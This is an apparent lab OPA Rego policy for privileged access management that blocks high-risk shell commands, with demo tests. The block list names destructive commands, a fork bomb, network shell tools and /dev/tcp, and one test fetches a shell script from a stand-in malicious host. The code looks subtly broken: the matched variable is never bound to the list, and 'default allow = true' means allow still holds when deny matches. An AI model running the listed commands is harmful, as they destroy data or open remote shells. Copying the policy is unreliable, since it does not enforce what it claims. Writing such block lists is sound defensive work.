# OPA Policy: Block high-risk commands in privileged sessions
# Risk-Based Access Control for PAM
# Enterprise Security Lab | Manjula Wickramasuriya

package pam.risk_commands

default allow = true

# High-risk commands to block
high_risk_commands := {
    "rm -rf /",
    "mkfs",
    ":(){ :|:& };:",
    "dd if=",
    "wget ",
    "curl ",
    "nc ",
    "netcat ",
    "ncat ",
    "> /etc/passwd",
    "> /etc/shadow",
    "chmod 777",
    "/dev/tcp",
}

# Deny if command matches high-risk pattern
deny[msg] {
    some risky
    contains(lower(input.command), risky)
    msg := sprintf("High-risk command detected and blocked: %s", [input.command])
}

# Allow low-risk commands (default allow = true, deny only on match)
allow {
    not deny[_]
}

# Demo test cases
test_allow_safe_command {
    allow with input as {"command": "ls -la"}
}

test_deny_rm_rf {
    some msg
    deny[msg] with input as {"command": "rm -rf /"}
}

test_deny_netcat {
    some msg
    deny[msg] with input as {"command": "nc -l 4444"}
}

test_deny_wget {
    some msg
    deny[msg] with input as {"command": "wget http://malicious.com/shell.sh"}
}
